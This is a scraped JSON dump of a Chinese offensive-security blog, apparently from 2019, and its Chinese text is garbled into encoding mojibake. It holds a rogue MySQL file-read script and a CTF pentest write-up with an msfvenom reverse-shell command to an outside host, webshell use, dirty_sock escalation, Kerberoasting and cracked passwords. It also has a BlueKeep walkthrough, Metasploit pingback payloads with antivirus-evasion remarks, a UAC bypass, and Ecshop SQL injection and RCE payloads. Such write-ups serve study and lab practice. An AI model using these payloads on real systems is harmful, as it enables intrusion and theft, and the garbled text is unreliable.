/proc/selfç›¸å¯¹äºè¿›ç¨‹PIDï¼Œæˆ‘ä»¬åœ¨å®æˆ˜çš„æ–‡ä»¶è¯»å–ä¸­ï¼Œæ›´å¤šä½¿ç”¨çš„æ˜¯/proc/selfç›®å½•ã€‚åœ¨stackexchangeæœ‰ä¸€ä¸ªè®¨è®ºï¼Œhttps://unix.stackexchange.com/questions/333225/which-process-is-proc-self-for ä¹Ÿå°±æ˜¯è¯´ï¼Œå…¶å®/proc/self æ˜¯æŒ‡å‘å½“å‰è¿›ç¨‹çš„å†…å­˜ æ¯”å¦‚ä¹‹å‰æŠ¤ç½‘æ¯2019çš„ä¸€é“åˆ©ç”¨ MySQL LOAD DATAç‰¹æ€§è¯»å–æ–‡ä»¶ï¼Œè®©phpè¿œç¨‹è¿æ¥åˆ°æˆ‘ä»¬çš„å®¢æˆ·ç«¯ï¼Œç„¶åå‘é€å‘½ä»¤ï¼Œç”±äºåœ¨è¿œç¨‹æœåŠ¡å™¨æ˜¯ä½¿ç”¨apacheè¿›ç¨‹æ¥è¿æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¯»å–åˆ°/proc/self/cwd/index.php 12345678910111213141516171819202122# coding=utf-8 import socketimport logginglogging.basicConfig(level=logging.DEBUG)filename=\"/proc/self/cwd/index.php\"sv=socket.socket()sv.bind((\"\",3306))sv.listen(5)conn,address=sv.accept()logging.info('Conn from: %r', address)conn.sendall(\"\\x4a\\x00\\x00\\x00\\x0a\\x35\\x2e\\x35\\x2e\\x35\\x33\\x00\\x17\\x00\\x00\\x00\\x6e\\x7a\\x3b\\x54\\x76\\x73\\x61\\x6a\\x00\\xff\\xf7\\x21\\x02\\x00\\x0f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x76\\x21\\x3d\\x50\\x5c\\x5a\\x32\\x2a\\x7a\\x49\\x3f\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00\")conn.recv(9999)logging.info(\"auth okay\")conn.sendall(\"\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00\")conn.recv(9999)logging.info(\"want file...\")wantfile=chr(len(filename)+1)+\"\\x00\\x00\\x01\\xFB\"+filenameconn.sendall(wantfile)content=conn.recv(9999)logging.info(content)conn.close() tip: å½“æ‰¾ä¸åˆ°ç½‘ç«™è·¯å¾„çš„æ—¶å€™ï¼Œå¯ä»¥åˆ©ç”¨/proc/self/cwdç›®å½•æ¥è¯»å–apacheè¿›ç¨‹çš„phpæ–‡ä»¶æºç  0x03 ç›¸å…³é“¾æ¥ğŸ”—https://blog.csdn.net/goodluckwhh/article/details/17010029https://unix.stackexchange.com/questions/333225/which-process-is-proc-self-forhttps://www.cnblogs.com/youxin/p/4980058.html","categories":[{"name":"linux","slug":"linux","permalink":"http://patrilic.top/categories/linux/"}],"tags":[{"name":"proc","slug":"proc","permalink":"http://patrilic.top/tags/proc/"}]},{"title":"N1CTF Pentest N1ctf2019.lab Write-up","slug":"N1CTF  Pentest N1ctf2019.lab Write-up","date":"2019-09-09T17:20:33.000Z","updated":"2019-09-09T15:03:25.597Z","comments":true,"path":"2019/09/10/N1CTF  Pentest N1ctf2019.lab Write-up/","link":"","permalink":"http://patrilic.top/2019/09/10/N1CTF  Pentest N1ctf2019.lab Write-up/","excerpt":"","text":"@Author: Patrilic@Time: 2019-09-10 01:20:33 0x00 å‰è¨€scanfå¤§å¸ˆå‚…çš„é¢˜ï¼Œtql..orzè¢«hayaå¸ˆå‚…å¸¦ç€åšäº†è€åŠå¤©ï¼Œæ‰è‚å‡ºæ¥ç¬¬ä¸€é¢˜ï¼Œç„¶ååé¢å› ä¸ºå¤ªå¤šäººæ…å±æ²¡åŠæ³•åšäº†.. ç°åœ¨æ¯”èµ›ç»“æŸäº†ï¼Œè¶ç€å¸ˆå‚…è¿˜æ²¡å…³ç¯å¢ƒå¤ç›˜ä¸€ä¸‹ 0x01 Step 1 å…¥å£ip:ç®€å•æ¢æµ‹ä¸€ä¸‹ç«¯å£ï¼š47.52.129.242 å‘ç°å¼€äº†ProFTPD 1.3.5 ç¨å¾®googoleä¸€ä¸‹ï¼Œå‘ç°å­˜åœ¨ä»»æ„æ–‡ä»¶æ‹·è´æ¼æ´ï¼ˆCVE-2019-12815ï¼‰ ä½¿ç”¨ncftp è¿æ¥ å…¶å®è¿˜æ˜¯è›®å¡çš„â€¦ ç„¶åæˆ‘ä»¬æŠŠmsgæ–‡ä»¶å†™å…¥åˆ°patrilic.phpé‡Œ PS: å¥½åƒWindowsè¿æ¥éœ€è¦å¯†ç ï¼Œç„¶åTOP1000å­—å…¸å°±å¯ä»¥çˆ†ç ´å‡ºæ¥ï¼Œç”¨æˆ·ftp å¯†ç  mustang æ‰€ä»¥ç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªwww-dataæƒé™çš„webshellï¼Œå…ˆåå¼¹ä¸€ä¸ªshellåˆ°æˆ‘ä»¬çš„vpsä¸Š å…ˆæŸ¥çœ‹ä¸€ä¸‹å†…æ ¸ç‰ˆæœ¬ï¼š okï¼Œä½¿ç”¨msfvenomç”Ÿæˆä¸€ä¸ªx64çš„linux reverse_shellæœ¨é©¬ï¼Œæ”¾åœ¨webç›®å½•ä¸‹ 1msfvenom --payload linux/x64/shell_reverse_tcp LHOST=45.xx.xx.xx LPORT=7778 -f elf -o /home/wwwroot/default/test.elf æˆ‘ä»¬ç”¨file_put_contents + file_get_contentså°†æ–‡ä»¶ä¸‹è½½åˆ°/tmpç›®å½•ä¸‹ ç„¶åç»™ä¸ªæ‰§è¡Œæƒé™ å°±å¯ä»¥å¼¹å›shelläº† ç„¶åç»™å®ƒå‡çº§ä¸€ä¸‹ï¼Œææˆmeterpreter session ææƒçš„è¯ï¼Œå› ä¸ºç»™äº†æç¤ºå˜›ï¼Œsnapï¼Œä¹Ÿèƒ½æ¯”è¾ƒå®¹æ˜“æƒ³åˆ°æ˜¯å¹´åˆé‚£ä¸ªæ¼æ´ CVE-2019-7304githubä¸Šä¹Ÿæœ‰exp:https://github.com/initstring/dirty_sock ç„¶åå› ä¸ºæœ‰å¸ˆå‚…æ…å±..å°±æŠŠsnapå‡çº§äº†ï¼Œå¯¼è‡´æ²¡æç¤ºçš„æ—¶å€™ï¼Œå¾ˆå¤šå¸ˆå‚…ä¸€è„¸æ‡µé€¼ ä¸è¿‡snapæ˜¯åœ¨18.04çš„ç‰ˆæœ¬ä¹‹åæ‰ä¼šè‡ªå¸¦ï¼Œæ‰€ä»¥åœ¨è¿™å«Œç–‘è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ æˆ‘ä»¬å…ˆç”¨pythonå¾—åˆ°ä¸€ä¸ªåŠäº’å¼shell1python -c \"import pty;pty.spawn('/bin/bash')\" å¯ä»¥çœ‹åˆ°å…¶å®ï¼Œè¿™ä¸ªexpä¼šç”Ÿæˆä¸€ä¸ªdirty_sockç”¨æˆ·ï¼Œå¹¶ä¸”å¯†ç å°±æ˜¯dirty_sock Get the flag: N1CTF{ImpOrtant_P0int3_4de0e} 0x02 Step 2 psè·å–è¿›ç¨‹åˆ—è¡¨ å¯ä»¥çœ‹åˆ°devä¸Šæœ‰ä¸€ä¸ªåŸŸç”¨æˆ· ä½¿ç”¨meterpreteråŠ è½½ä¸€ä¸ªpowerview.ps1æ¥å¸®åŠ©æˆ‘ä»¬ä¿¡æ¯æœé›† æ³¨æ„åœ¨ç°åœ¨çš„branché‡Œæ˜¯æ²¡æœ‰Get-DomainUserç­‰å‡½æ•°çš„ï¼Œä½¿ç”¨https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L4906 ä»¥ä¸‹çœç•¥1000å­—(å°±æ˜¯å¸¸è§„çš„Get-DomainUserç­‰è¿›è¡Œæœé›†) é€šè¿‡ä¿¡æ¯æœé›†ï¼Œæˆ‘ä»¬è·å–åˆ°äº†å­˜åœ¨ä¸€ä¸ªbackup Server è°ƒç”¨Invoke-Kerberoastè·å–SPNå¯†æ–‡è§£å¯†ï¼š P@ssword123 ç„¶ååé¢å°±æ˜¯çº¦æŸå§”æ´¾ï¼Œææƒæ‹¿åˆ°\\backup.n1ctf2019.lab\\backupfile\\DCServerçš„è®¿é—®æƒé™ é‡Œé¢å­˜æœ‰æ³¨å†Œè¡¨å¤‡ä»½ï¼Œä½¿ç”¨impacketå¥—ä»¶è§£å¯†åæ‹¿åˆ°æœ¬åœ°ç®¡ç†å‘˜hash ç„¶åé“¶ç¥¨æ®ï¼Œé‡‘ç¥¨æ®ï¼Œæ‹¿åˆ°DCæƒé™ï¼Œæœ€åæ‹¿åˆ°åŸŸç®¡ç†å‘˜æ¡Œé¢ä¸Šçš„flag 0x03 æ€»ç»“å› ä¸ºåé¢éš§é“å®åœ¨æ˜¯å¤ªä¸ç¨³å®šäº†,sessionç–¯ç‹‚æ‰,ä¸€ç›´åœ¨88è¿™å°æœºå­ä¸Šè½¬æ‚ è™½ç„¶å¥½åƒå°±æˆ‘ä¸€ä¸ªäººåœ¨å¼„ vultrçœŸæƒ¨å•Š.. ç„¶ååé¢çš„çº¦æŸå§”æ´¾ï¼Œå®åœ¨æ˜¯ä¸æ€ä¹ˆç†Ÿæ‚‰ï¼Œè¿˜æ˜¯ç»éªŒå¤ªå°‘.. æœ€åå®åè†œä¸€æ³¢scanfå¸ˆå‚…ï¼Œä»¥åŠå¸¦æˆ‘é£çš„hayaå¸ˆå‚…ï¼Œorz å¥‰ä¸Šå®˜æ–¹wpï¼šhttps://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/Pentest_N1CTF2019.lab/README.md Nu1Lå¤ªå¼ºäº†ï¼Œ ä¹Ÿæ„Ÿè°¢ä¸€æ³¢scanfå¸ˆå‚…å¸¦æ¥è¿™ä¹ˆæœ‰è¶£çš„é¢˜ç›®ï¼ˆä¸è¿‡å¦‚æœæ²¡äººæ…å±çš„è¯è¯´ä¸å®šèƒ½è‚å‡ºæ¥step2 hhhhï¼‰ æœ€åè¿˜æ˜¯è§‰å¾—ï¼Œè¿‡æ®µæ—¶é—´å¥½å¥½ç ”ç©¶ä¸€æ³¢kerberosï½ï¼Œè¶ç€è¿˜åœ¨å­¦æ ¡hhhh(kekeoéƒ½æ²¡ç”¨è¿‡çš„æˆ‘ å¤ªèœäº†ï¼‰","categories":[{"name":"Write-up","slug":"Write-up","permalink":"http://patrilic.top/categories/Write-up/"}],"tags":[{"name":"n1ctf-pentest","slug":"n1ctf-pentest","permalink":"http://patrilic.top/tags/n1ctf-pentest/"}]},{"title":"CVE-2019-0708 RDP è¿œç¨‹ä»£ç æ‰§è¡Œ","slug":"CVE-2019-0708 RDP è¿œç¨‹ä»£ç æ‰§è¡Œ","date":"2019-09-09T09:03:55.000Z","updated":"2019-09-09T12:07:38.289Z","comments":true,"path":"2019/09/09/CVE-2019-0708 RDP è¿œç¨‹ä»£ç æ‰§è¡Œ/","link":"","permalink":"http://patrilic.top/2019/09/09/CVE-2019-0708 RDP è¿œç¨‹ä»£ç æ‰§è¡Œ/","excerpt":"","text":"@Author: Patrilic@Time: 2019-09-09 17:03:55 0x00 å‰è¨€RDPæœåŠ¡çš„æ¼æ´ï¼Œé™¤äº†ä¹‹å‰çš„ms12-020(è¡¥ä¸å·ï¼šKB2621440)ï¼Œå½±å“æœ€è½°åŠ¨çš„ä¹Ÿå°±æ˜¯è¿™æ¬¡çš„bluekeepäº†ï¼Œhwä¹‹å‰çˆ†å‡ºçš„æ¼æ´ï¼Œå‰ä¸¤å¤©rapid7å®˜æ–¹åœ¨githubä¸Šä¼ äº†æœ€æ–°çš„expï¼Œå¯ç›´æ¥åˆ©ç”¨ã€‚ å½±å“èŒƒå›´123456789Windows 7Windows Server 2008 R2Windows Server 2008Windows Server 2003Windows XP 0x01 æ¼æ´å¤ç°ç›®å‰éœ€è¦æ›¿æ¢expåŒ…ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯MacOSç¯å¢ƒï¼ˆexpåŒ…åˆ°å¤„éƒ½æœ‰ï¼Œå°±ä¸æ”¾äº†)1234567cve_2019_0708_bluekeep_rce.rb æ·»åŠ åˆ° /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rbrdp.rb æ›¿æ¢ /opt/metasploit-framework/embedded/framework/lib/msf/corerdp_scanner.rb æ›¿æ¢ /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/dp_scanner.rbcve_2019_0708_bluekeep.rb æ›¿æ¢ /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb æ›¿æ¢å®Œæˆä¹‹åä½¿ç”¨reload_allåŠ è½½æ¨¡å— å¯ä»¥çœ‹åˆ°å­˜åœ¨4ä¸ªtargetsï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯VMWareï¼Œæ‰€ä»¥é€‰target 3 Windows 7 ultimate SP1 ä½†æ˜¯å…³æ‰sessionåé‡æ–°æ‰“ç¬¬äºŒæ¬¡ï¼Œå°±è“å±äº† Windows Server 2008 R2 ï¼Œæœç„¶è“å±äº†2333 0x02 æ€»ç»“å¬å¤§ä½¬è¯´ï¼Œæ ¸å¿ƒä»£ç è¿˜æ²¡æ”¾å‡ºæ¥ï¼Œæµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°é™¤äº†08çš„ä¸èƒ½æˆåŠŸï¼Œå…¶ä»–éƒ½è¿˜okï¼Œï¼ˆå¬è¯´éœ€è¦ä¿®æ”¹æ³¨å†Œè¡¨ï¼‰ 0x03 ç›¸å…³é“¾æ¥ğŸ”—https://www.freebuf.com/news/203584.htmlhttps://www.freebuf.com/vuls/205380.htmlhttps://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2012/ms12-020https://github.com/rapid7/metasploit-framework/pull/12283/files#diff-880ad99e50249db44c2f19b94f7a4870","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"http://patrilic.top/categories/æ¼æ´å¤ç°/"}],"tags":[{"name":"BlueKeep","slug":"BlueKeep","permalink":"http://patrilic.top/tags/BlueKeep/"}]},{"title":"MSF Pingback Payloads","slug":"Payloads","date":"2019-09-05T16:47:46.000Z","updated":"2019-09-16T06:42:00.915Z","comments":true,"path":"2019/09/06/Payloads/","link":"","permalink":"http://patrilic.top/2019/09/06/Payloads/","excerpt":"","text":"0x00 å‰è¨€ æ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼Œæ–‡ç« é“¾æ¥ï¼šhttps://xz.aliyun.com/t/6268 ä»Šå¤©æ—©ä¸ŠRapid7cnçš„å…¬ä¼—å·æ›´æ–°äº†ä¸€ç¯‡æ–‡ç« ï¼Œç„¶åå°±è¢«ç¾¤é‡Œçš„å¤§å¸ˆå‚…ä»¬è½¬å‘äº†å¥½å‡ é233ï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ï¼Œä¹Ÿæƒ³ç€åˆ†æä¸€ä¸‹ https://mp.weixin.qq.com/s/ZI-qQ_ORKG_gJ2Wnc2PiRA å®˜ç½‘ï¼š https://blog.rapid7.com/2019/08/01/introducing-pingback-payloads/ 0x01 pingbackè¿™æ¬¡ä¸€å…±æ›´æ–°äº†10ä¸ªpingback payload, è‡³äºä»€ä¹ˆæ˜¯pingbackï¼Œå…¶å®msfå®˜æ–¹åœ¨githubå·²ç»è¯´çš„å¾ˆæ¸…æ¥šäº†https://github.com/rapid7/metasploit-framework/pull/12129 Pingback payloads are designed to provide a limited-functionality payload to verify an exploit has worked. It does not provide a shell of any kind. A pingback payload creates a â€œrandomâ€ UUID value (separate from the payload UUID) that is written to the Metasploit database along with other data. When executed on target, the payload sends back that UUID to verify that the exploit worked, but nothing else. When Framework receives that UUID, we verify the target is vulnerable to the exploit without loading an interactive shell.This prevents traditional [W/M]ITM attacks or someone sniffing the traffic for information, as the UUID itself means nothing to a listener, and without further execution, the session itself is not particularly valuable to an attacker. ç®€å•æ¥è¯´æ„Ÿè§‰å…¶å®å°±æ˜¯ï¼ŒAVå¯¹msfä¹‹å‰çš„å¸¸è§„reverse_shellä¼šè¿›è¡Œæ‹¦æˆªï¼Œå¯¼è‡´æˆ‘ä»¬å¹¶ä¸èƒ½å¾ˆæ¸…æ¥šçš„çŸ¥é“ç›®æ ‡æ˜¯å¦å­˜åœ¨è¯¥æ¼æ´ï¼Œç„¶åè¿™ä¸ªpayloadå°±å®Œå…¨ä¸ä¼šäº§ç”Ÿäº¤äº’å¼shellï¼Œè€Œåªæ˜¯è¿”å›ä¸€ä¸ªUUIDï¼Œèƒ½è®©æˆ‘ä»¬çŸ¥é“poc/expæ˜¯å¦æ‰§è¡ŒæˆåŠŸï¼Œç„¶åç›®æ ‡æ˜¯å¦å­˜åœ¨å½“å‰æ¼æ´ï¼Œè€Œä¸å¿…æ‹…å¿ƒè¢«ä¸­é—´äººæ”»å‡»æˆ–è€…è¢«æ‹¦æˆª 0x02 How to Useç¿»çœ‹ä»£ç ï¼Œæˆ‘ä»¬å‘ç°å®ƒå…¶å®æ˜¯æ¯æ¬¡ç”Ÿæˆä¸€ä¸ªæ–°çš„UUIDï¼Œç„¶åå°†å…¶å‘é€åˆ°ç›®æ ‡ä¸­ï¼Œç„¶åè°ƒç”¨listenerä¸­çš„payloadè®¾ç½®ä¸€ä¸ªç›‘å¬ï¼Œç„¶åå½“ç¨‹åºè¿›è¡Œ Pingback æ—¶ï¼ŒMSFæ‰“å¼€ä¸€ä¸ªä¼šè¯æ¥æ¥å—UUIDï¼Œæœ€åæ‹¿åˆ°å®Œæ•´UUIDåï¼Œå°±å…³é—­å½“å‰session 12345678910# msf/modules/payloads/singles/ruby/pingback_reverse_tcp.rbdef ruby_string self.pingback_uuid ||= self.generate_pingback_uuid lhost = datastore['LHOST'] lhost = \"[#&#123;lhost&#125;]\" if Rex::Socket.is_ipv6?(lhost) return \"require'socket';\" \\ \"c=TCPSocket.new'#&#123;lhost&#125;',#&#123;datastore['LPORT'].to_i&#125;;\" \\ \"c.puts'#&#123;[[self.pingback_uuid].pack('H*')].pack('m0')&#125;'.unpack('m0');\" \"c.close\" end 12345678910111213141516171819202122232425262728# msf/base/sessions/pingback.rbdef uuid_read uuid_raw = rstream.get_once(16, 1) return nil unless uuid_raw self.uuid_string = uuid_raw.each_byte.map &#123; |b| \"%02x\" % b.to_i() &#125;.join print_status(\"Incoming UUID = #&#123;uuid_string&#125;\") if framework.db.active begin payload = framework.db.payloads(uuid: uuid_string).first if payload.nil? print_warning(\"Provided UUID (#&#123;uuid_string&#125;) was not found in database!\") else print_good(\"UUID identified (#&#123;uuid_string&#125;)\") end rescue ActiveRecord::ConnectionNotEstablished print_status(\"WARNING: UUID verification and logging is not available, because the database is not active.\") rescue =&gt; e # TODO: Can we have a more specific exception handler? # Test: what if we send no bytes back? What if we send less than 16 bytes? Or more than? elog(\"Can't get original UUID\") elog(\"Exception Class: #&#123;e.class.name&#125;\") elog(\"Exception Message: #&#123;e.message&#125;\") elog(\"Exception Backtrace: #&#123;e.backtrace&#125;\") end else print_warning(\"WARNING: UUID verification and logging is not available, because the database is not active.\") end end ç„¶ååœ¨ option.rb ä¸­ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°pingbackçš„æ¨¡å—å­˜åœ¨ä¸¤ä¸ªé€‰é¡¹ï¼š 12345678def initialize(info = &#123;&#125;) super register_advanced_options( [ Msf::OptInt.new('PingbackRetries', [true, \"How many additional successful pingbacks\", 0]), Msf::OptInt.new('PingbackSleep', [true, \"Time (in seconds) to sleep between pingbacks\", 30]) ], self.class) end PingbackRetries - pingbackçš„æ¬¡æ•° PingbackSleep - pinigbackçš„æ—¶é—´é—´éš” æˆ‘ä»¬åˆ©ç”¨ Msfvenom ç”Ÿæˆä¸€ä¸ª windows/x64/pingback_reverse_tcp çš„exeæœ¨é©¬ 1msfvenom -p windows/x64/pingback_reverse_tcp -f exe -o patrilic.exe LHOST=192.168.1.107 LPORT=4445 EXITFUNC=thread PINGBACKRETRIES=10 PINGBACKSLEEP=5 ç„¶ååœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œæ—¶ï¼š åªä¼šè¿”å›UUID ç„¶åç›®æ ‡æœºå™¨ä¸Šå¹¶æ²¡æœ‰äº§ç”Ÿä»»ä½•çš„äº¤äº’å¼shellï¼ŒåŒæ—¶ä½¿ç”¨ Wireshark ä¹Ÿåªèƒ½æ•è·åˆ°16byteçš„UUIDå€¼ 0x03 æ€»ç»“è¿™æ¬¡æ›´æ–°çš„pingback payloadï¼Œå·²ç»æ„Ÿè§‰æ˜¯æœ€å°åŒ–çš„æ”»å‡»è½½è·äº†ï¼Œè€Œä¸”ç‰¹å¾ä¹Ÿå¹¶ä¸æ˜æ˜¾ï¼Œåªæ˜¯ä¸€ä¸²éšæœºçš„UUIDå€¼è€Œå·²ï¼Œæ„Ÿè§‰ç”¨æ¥éªŒè¯æ¼æ´è¿˜æ˜¯æŒºä¸é”™çš„ï¼Œç„¶ååé¢å†åŠæ³•å»æ‰expç‰¹å¾ï¼Œä½¿ç”¨å¦å¤–çš„æ–¹å¼æ¥è·å¾—äº¤äº’å¼shellæˆ–è€…ç›´æ¥æ‰§è¡Œå‘½ä»¤äº‘äº‘.. å½“ç„¶ï¼Œmsfç›´æ¥ç”Ÿæˆçš„ç¨‹åºç‰¹å¾è¿˜æ˜¯æŒºæ˜æ˜¾çš„ï¼Œè¿˜æ˜¯éœ€è¦è¿›è¡Œå…æ€ï¼Œä¸è¿‡ç”±äºè¿™ä¸ªpayloadå¹¶æ²¡æœ‰è¿›è¡Œèµ·æ•æ„Ÿè¿›ç¨‹ï¼Œæ‰€ä»¥è¿˜æ˜¯æ¯”è¾ƒå¥½å…æ€çš„ã€‚ shellcodeéšä¾¿åŠ å¯†æäº†ä¸‹ï¼Œé™æ€è¿˜è¡Œï¼Œä½†æ˜¯åŠ¨æ€ä¼°è®¡ä¹Ÿæ²¡å•¥2333æ¯•ç«Ÿä¹Ÿæ²¡æœ‰å±é™©è¿›ç¨‹ï¼Œåªæ˜¯å¼€äº†ä¸ªsocket ç„¶åè¿›ç¨‹å¼€èµ·æ¥çš„è¯ï¼Œæ‰¾äº†ä¸ª360çš„æœºå­è¯•äº†ä¸‹ï¼Œæ²¡å•¥é—®é¢˜ ä¸è¿‡ç‰¹å¾ä¼°è®¡ä¹Ÿå¿«æ™®åŠäº†ï¼Œæ„Ÿè§‰æ€è·¯æŒºå¥½çš„ï¼Œå­¦ä¹ äº†ï½","categories":[{"name":"Red-Team Tricks","slug":"Red-Team-Tricks","permalink":"http://patrilic.top/categories/Red-Team-Tricks/"}],"tags":[{"name":"metasploit","slug":"metasploit","permalink":"http://patrilic.top/tags/metasploit/"}]},{"title":"Windows10 BypassUAC with WSReset.exe","slug":"Windows10 BypassUAC with WSReset.exe","date":"2019-08-29T15:51:00.000Z","updated":"2019-08-30T00:49:55.667Z","comments":true,"path":"2019/08/29/Windows10 BypassUAC with WSReset.exe/","link":"","permalink":"http://patrilic.top/2019/08/29/Windows10 BypassUAC with WSReset.exe/","excerpt":"","text":"@Author: PatrilicTime: 2019-08-29 23:51:00 0x00 å‰è¨€https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html åˆ©ç”¨WSReset.exeè¿›è¡ŒbypassUACã€‚ ä¸ºä»€ä¹ˆåªé™äºWin10å‘¢ï¼Œå› ä¸ºè¿™ä¸ªä½äºC:\\WINDWOS\\System32 ç›®å½•ä¸‹çš„ç¨‹åºï¼Œæ˜¯å¾®è½¯å•†åº—çš„ä¸€ä¸ªå·¥å…· 0x01 Bypassè¿™é‡ŒåŸä½œè€…è‡ªå·±ç¼–å†™äº†è„šæœ¬å’Œå·¥å…·ï¼šhttps://github.com/sailay1996/UAC_bypass_windows_store é¦–å…ˆä½¿ç”¨UAC.bat åˆ›å»ºä¸€ä¸ªå¸¦ç©ºæ ¼å­—ç¬¦çš„ç›®å½•ï¼Œç„¶åæŠŠWSResetæ‰”è¿›å» æ¥ç€è¿è¡Œuac_bypass.exe è°ƒç”¨DLLï¼Œå¼¹å‡ºå¯¹è¯æ¡†ä¸»è¦å°±æ˜¯å› ä¸ºè¿™ä¸ªğŸ‘‰ ç„¶åä¼šå¼¹å‡ºä¸€ä¸ªç®¡ç†å‘˜çš„CMD ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œè™šæ‹Ÿæœºä¸€ç›´ä¿æŒé«˜é€Ÿä¸‹è½½ æ„Ÿè§‰ç¨‹åºé‡Œæœ‰äº›ä¸œè¥¿..åé¢æ— èŠå†åˆ†æå§ã€‚ 0x02 æ€»ç»“bypassUACæ–¹æ³•å¤šç§å¤šæ ·ï¼Œçœ‹è¿™ä¸ªåªæ˜¯å› ä¸ºå¥½ç©ï¼Œç”¨å¾®è½¯æ²¡å•¥ç”¨çš„åº”ç”¨å•†åº—çš„ç»„ä»¶ï¼Œå…¶å®æœ¬è´¨ä¸Šè¿˜æ˜¯DLLåŠ«æŒ2333","categories":[{"name":"BypassUac","slug":"BypassUac","permalink":"http://patrilic.top/categories/BypassUac/"}],"tags":[{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"http://patrilic.top/tags/å†…ç½‘æ¸—é€/"}]},{"title":"Ecshop 2.x/3.x SQLæ³¨å…¥ + ä»£ç æ‰§è¡Œ","slug":"Ecshop 2.x ä»£ç æ‰§è¡Œ","date":"2019-08-26T16:03:02.000Z","updated":"2019-08-27T18:00:58.699Z","comments":true,"path":"2019/08/27/Ecshop 2.x ä»£ç æ‰§è¡Œ/","link":"","permalink":"http://patrilic.top/2019/08/27/Ecshop 2.x ä»£ç æ‰§è¡Œ/","excerpt":"","text":"@Author: Patrilic@Time: 2019-8-27 00:03:02 0x00 å‰è¨€å¾ˆå¤šQBçš„Passer6yç»™æˆ‘å‘äº†ä¸ªé•¿å¾—å¥‡å¥‡æ€ªæ€ªçš„payloadï¼Œæƒ³äº†ä¸‹ï¼Œå¥½åƒæ˜¯Ecshop 2.xçš„RCEï¼Œæ˜¨å¹´çœ‹åˆ°å°±æƒ³åˆ†æï¼Œä¸€ç›´æå¿˜äº†.. ä»Šæ™šè¡¥ä¸Šï¼PS: é€Ÿåº¦ä¸æ¿€æƒ…çœŸçš„å¥½çœ‹ï¼ŒDwayne Johnsonå¤ªå¸…ahhhh 0x01 ç¯å¢ƒæ­å»ºä½¿ç”¨phpstudy 2018 æ­å»º åˆ†æå·¥å…·ï¼š PhpStormphp 5.3.29 nts + ApacheMySQL 5.5.3 0x02 æ¼æ´å¤ç°SQLæ³¨å…¥æ¼æ´å‘ç”Ÿåœ¨user.php çš„ Refererå¤„payload:1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:\"num\";s:72:\"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -\";s:2:\"id\";i:1;&#125; ä»£ç æ‰§è¡Œå…¶å®æ˜¯SQLæ³¨å…¥çš„è¿›ä¸€æ­¥åˆ©ç”¨ï¼ŒåŒæ ·æ˜¯åœ¨user.phppayload:1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:\"num\";s:110:\"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -\";s:2:\"id\";s:4:\"' /*\";&#125;554fcae493e564ee0dc75bdf2ebf94ca 0x03 æ¼æ´åˆ†æSQLæ³¨å…¥æ¼æ´ç›´æ¥çœ‹æ¼æ´å‘ç”Ÿç‚¹ï¼šæ—¢ç„¶payloadæ˜¯ä»Refererä¼ è¿›æ¥çš„ï¼Œé‚£ä¹ˆå°±ç›´æ¥çœ‹[&#39;HTTP_REFERER&#39;]user.php123456789101112131415161718192021222324252627/* ç”¨æˆ·ç™»å½•ç•Œé¢ */elseif ($action == 'login')&#123; if (empty($back_act)) &#123; if (empty($back_act) &amp;&amp; isset($GLOBALS['_SERVER']['HTTP_REFERER'])) &#123; $back_act = strpos($GLOBALS['_SERVER']['HTTP_REFERER'], 'user.php') ? './index.php' : $GLOBALS['_SERVER']['HTTP_REFERER']; &#125; else &#123; $back_act = 'user.php'; &#125; &#125; $captcha = intval($_CFG['captcha']); if (($captcha &amp; CAPTCHA_LOGIN) &amp;&amp; (!($captcha &amp; CAPTCHA_LOGIN_FAIL) || (($captcha &amp; CAPTCHA_LOGIN_FAIL) &amp;&amp; $_SESSION['login_fail'] &gt; 2)) &amp;&amp; gd_version() &gt; 0) &#123; $GLOBALS['smarty']-&gt;assign('enabled_captcha', 1); $GLOBALS['smarty']-&gt;assign('rand', mt_rand()); &#125; $smarty-&gt;assign('back_act', $back_act); $smarty-&gt;display('user_passport.dwt');&#125; $back_act ä»HTTP_REFERERé‚£é‡Œæ‹¿åˆ°å€¼ï¼Œç„¶å$smarty-&gt;assign(&#39;back_act&#39;, $back_act);å°†$back_actä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨assignå‡½æ•°å®é™…è°ƒç”¨çš„æ˜¯/includes/cls_template.phpä¸‹çš„assignå‡½æ•° 1234567891011121314151617181920function assign($tpl_var, $value = '') &#123; if (is_array($tpl_var)) &#123; foreach ($tpl_var AS $key =&gt; $val) &#123; if ($key != '') &#123; $this-&gt;_var[$key] = $val; &#125; &#125; &#125; else &#123; if ($tpl_var != '') &#123; 